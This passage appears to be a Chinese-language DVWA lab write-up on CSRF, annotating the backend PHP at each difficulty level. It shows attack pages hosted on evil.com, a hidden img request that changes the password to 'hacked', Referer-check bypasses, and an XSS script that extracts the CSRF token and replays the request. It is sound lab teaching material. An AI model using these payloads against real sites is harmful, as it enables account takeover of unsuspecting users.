class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h3><p><strong>完整攻击流程：</strong></p>
+<ol>
+<li><p><strong>攻击者准备</strong></p>
+<ul>
+<li>创建 csrf_attack.html</li>
+<li>上传到自己的服务器 <a target="_blank" rel="noopener" href="http://evil.com/csrf_attack.html">http://evil.com/csrf_attack.html</a></li>
+</ul>
+</li>
+<li><p><strong>诱导受害者</strong></p>
+<ul>
+<li>发送邮件：”您有一份重要文件待查看：<a target="_blank" rel="noopener" href="http://evil.com/csrf_attack.html&quot;">http://evil.com/csrf_attack.html&quot;</a></li>
+<li>社交网络分享</li>
+<li>论坛发帖</li>
+</ul>
+</li>
+<li><p><strong>受害者操作</strong></p>
+<ul>
+<li>已登录DVWA（Cookie有效）</li>
+<li>点击链接访问 evil.com&#x2F;csrf_attack.html</li>
+<li>页面自动加载，发送恶意请求</li>
+</ul>
+</li>
+<li><p><strong>攻击完成</strong></p>
+<ul>
+<li>DVWA密码被改为”hacked”</li>
+<li>攻击者可以用新密码登录</li>
+<li>受害者可能很久才发现</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>添加了Referer检查，但可以绕过。</p>
+<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交了修改密码的请求</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：检查Referer头部 ★★★</span></span><br><span class="line">    <span class="comment">// $_SERVER[&#x27;HTTP_REFERER&#x27;] - HTTP Referer头，表示请求来源页面</span></span><br><span class="line">    <span class="comment">// 浏览器会自动设置这个值，表示从哪个页面跳转过来的</span></span><br><span class="line">    <span class="comment">// stripos() - 查找字符串首次出现的位置（不区分大小写）</span></span><br><span class="line">    <span class="comment">// 参数1：被搜索的字符串（Referer）</span></span><br><span class="line">    <span class="comment">// 参数2：要查找的字符串（服务器名）</span></span><br><span class="line">    <span class="comment">// 返回值：找到返回位置（&gt;= 0），未找到返回false</span></span><br><span class="line">    <span class="comment">// !== false - 严格不等于false（必须找到）</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Referer包含服务器名，认为是合法请求</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取新密码</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 验证两次密码是否一致</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// MD5加密</span></span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 转义特殊字符</span></span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 更新密码</span></span><br><span class="line">            <span class="variable">$query</span>  = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="variable">$_SESSION</span>[ <span class="string">&#x27;username&#x27;</span> ] . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ★★★ Referer检查失败 ★★★</span></span><br><span class="line">        <span class="comment">// 输出错误信息</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>Referer检查</strong> - 验证请求是否来自本站</li>
+</ol>
+<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><ol>
+<li><strong>Referer可以伪造</strong> - 浏览器可以设置</li>
+<li><strong>检查不严格</strong> - 只检查是否包含服务器名</li>
+<li><strong>仍使用GET请求</strong></li>
+</ol>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：文件名包含目标域名"><a href="#方法1：文件名包含目标域名" class="headerlink" title="方法1：文件名包含目标域名"></a>方法1：文件名包含目标域名</h4><p><strong>原理：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码检查</span></span><br><span class="line"><span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>], <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>]) !== <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_NAME&#x27;] = &#x27;dvwa.local&#x27;</span></span><br><span class="line"><span class="comment">// 只要Referer包含 &#x27;dvwa.local&#x27; 就能通过</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过方式：</strong></p>
+<p>创建文件名包含目标域名的HTML文件：</p>
+<p>文件名：<code>dvwa.local.html</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>攻击页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>中奖通知<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 当用户访问 http://evil.com/dvwa.local.html 时 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Referer会是: http://evil.com/dvwa.local.html --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 包含了 &#x27;dvwa.local&#x27; 字符串！ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>完整路径示例：</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击者服务器：http:<span class="comment">//evil.com/dvwa.local.html</span></span><br><span class="line">Referer: http:<span class="comment">//evil.com/dvwa.local.html</span></span><br><span class="line"><span class="function"><span class="title">stripos</span><span class="params">(<span class="string">&#x27;http://evil.com/dvwa.local.html&#x27;</span>, <span class="string">&#x27;dvwa.local&#x27;</span>)</span></span> = <span class="number">19</span>（找到了！）</span><br><span class="line">检查通过 ✅</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：目录名包含目标域名"><a href="#方法2：目录名包含目标域名" class="headerlink" title="方法2：目录名包含目标域名"></a>方法2：目录名包含目标域名</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">目录结构：</span><br><span class="line">evil.com/</span><br><span class="line">  └── dvwa.local/</span><br><span class="line">        └── attack.html</span><br><span class="line"></span><br><span class="line">访问：http:<span class="regexp">//</span>evil.com<span class="regexp">/dvwa.local/</span>attack.html</span><br><span class="line">Referer: http:<span class="regexp">//</span>evil.com<span class="regexp">/dvwa.local/</span>attack.html</span><br><span class="line">包含 <span class="string">&#x27;dvwa.local&#x27;</span> ✅</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：查询参数包含目标域名"><a href="#方法3：查询参数包含目标域名" class="headerlink" title="方法3：查询参数包含目标域名"></a>方法3：查询参数包含目标域名</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 访问：http://evil.com/attack.html?ref=dvwa.local --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Referer: http://evil.com/attack.html?ref=dvwa.local --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 包含 &#x27;dvwa.local&#x27; ✅ --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>添加了CSRF Token和用户交互确认。</p>
+<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：检查是否提供了CSRF Token ★★★</span></span><br><span class="line"><span class="comment">// user_token - 用户提交的token</span></span><br><span class="line"><span class="comment">// session_token - 服务器session中存储的正确token</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护：验证CSRF Token ★★★</span></span><br><span class="line">    <span class="comment">// checkToken() - DVWA自定义函数</span></span><br><span class="line">    <span class="comment">// 作用：对比用户提交的token和session中的token是否匹配</span></span><br><span class="line">    <span class="comment">// 如果不匹配，重定向到index.php</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token验证通过</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取新密码</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：stripslashes()去除反斜杠 ★★★</span></span><br><span class="line">    <span class="comment">// stripslashes() - 删除字符串中的反斜杠\</span></span><br><span class="line">    <span class="comment">// 作用：清理可能的转义字符</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证两次密码是否一致</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// MD5加密</span></span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转义特殊字符</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新密码</span></span><br><span class="line">        <span class="variable">$query</span>  = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="variable">$_SESSION</span>[ <span class="string">&#x27;username&#x27;</span> ] . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) : <span class="literal">false</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 生成新的CSRF Token ★★★</span></span><br><span class="line"><span class="comment">// generateSessionToken() - DVWA自定义函数</span></span><br><span class="line"><span class="comment">// 作用：生成随机token并存储到session</span></span><br><span class="line"><span class="comment">// 每次页面加载都会生成新token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>CSRF Token验证</strong> - 每个请求必须携带有效token</li>
+<li><strong>Token随机生成</strong> - 每次页面加载生成新token</li>
+<li><strong>stripslashes()</strong> - 额外输入过滤</li>
+</ol>
+<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><ol>
+<li><strong>仍使用GET请求</strong> - Token可能被记录</li>
+<li><strong>Token可以被提取</strong> - 通过XSS或其他方式</li>
+</ol>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：结合XSS漏洞"><a href="#方法1：结合XSS漏洞" class="headerlink" title="方法1：结合XSS漏洞"></a>方法1：结合XSS漏洞</h4><p>如果目标网站存在XSS漏洞，可以：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设DVWA存在XSS漏洞</span></span><br><span class="line"><span class="comment">// 注入JavaScript代码提取token</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">// 1. 先访问CSRF页面获取token</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://dvwa.local/dvwa/vulnerabilities/csrf/&#x27;</span>)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">html</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 2. 从HTML中提取token</span></span><br><span class="line">        <span class="keyword">var</span> parser = <span class="keyword">new</span> <span class="title class_">DOMParser</span>();</span><br><span class="line">        <span class="keyword">var</span> doc = parser.<span class="title function_">parseFromString</span>(html, <span class="string">&#x27;text/html&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> token = doc.<span class="title function_">querySelector</span>(<span class="string">&#x27;input[name=&quot;user_token&quot;]&#x27;</span>).<span class="property">value</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 使用提取的token发起CSRF攻击</span></span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://dvwa.local/dvwa/vulnerabilities/csrf/&#x27;</span> +</span><br><span class="line">                  <span class="string">&#x27;?password_new=hacked&#x27;</span> +</span><br><span class="line">                  <span class="string">&#x27;&amp;password_conf=hacked&#x27;</span> +</span><br><span class="line">                  <span class="string">&#x27;&amp;Change=Change&#x27;</span> +</span><br><span class="line">                  <span class="string">&#x27;&amp;user_token=&#x27;</span> + token;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 发送恶意请求</span></span><br><span class="line">        <span class="title function_">fetch</span>(url);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：社会工程学"><a href="#方法2：社会工程学" class="headerlink" title="方法2：社会工程学"></a>方法2：社会工程学</h4><p>虽然有token，但可以通过以下方式：</p>
+<ol>
+<li><p><strong>钓鱼攻击</strong></p>
+<ul>
+<li>创建仿冒的DVWA页面</li>
+<li>诱导用户输入密码</li>
+<li>实际上提交到攻击者服务器</li>
+</ul>
+</li>
+<li><p><strong>中间人攻击</strong></p>
+<ul>
+<li>拦截用户请求</li>
+<li>提取token</li>
+<li>发起攻击</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完善的CSRF防护，几乎无法攻破。</p>
+<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 改进1：使用POST方法 ★★★</span></span><br><span class="line"><span class="comment">// $_POST - 从POST请求体获取数据，不会出现在URL中</span></span><br><span class="line"><span class="comment">// 更安全，不会被记录在浏览器历史、服务器日志等</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ CSRF Token验证 ★★★</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前密码（★★★ 新增 ★★★）</span></span><br><span class="line">    <span class="comment">// 这是关键改进：必须输入当前密码才能修改</span></span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取新密码</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理输入</span></span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 